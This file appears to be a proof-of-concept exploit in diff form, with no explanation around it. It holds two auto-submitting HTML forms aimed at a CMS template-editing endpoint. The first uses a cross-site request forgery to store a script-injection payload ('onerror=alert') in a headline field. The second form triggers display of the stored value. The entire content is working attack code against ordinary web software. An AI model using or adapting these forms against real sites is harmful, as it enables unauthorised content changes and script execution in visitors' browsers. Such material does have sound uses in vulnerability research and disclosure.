@@ -1,0 +1,17 @@
+&lt;form action=&quot;http://www.example.com/cms//edit/tpl_edit_action.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;save&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;value[headline]&quot; value=&#039;headl2&lt;img src=x onerror=alert(234)&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;winid&quot; value=&quot;0&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+Second code:
+&lt;form action=&quot;http://www.example.com/cms//edit/tpl_edit_action.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;value&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;tabid&quot; value=&quot;headline&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;winid&quot; value=&quot;0&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
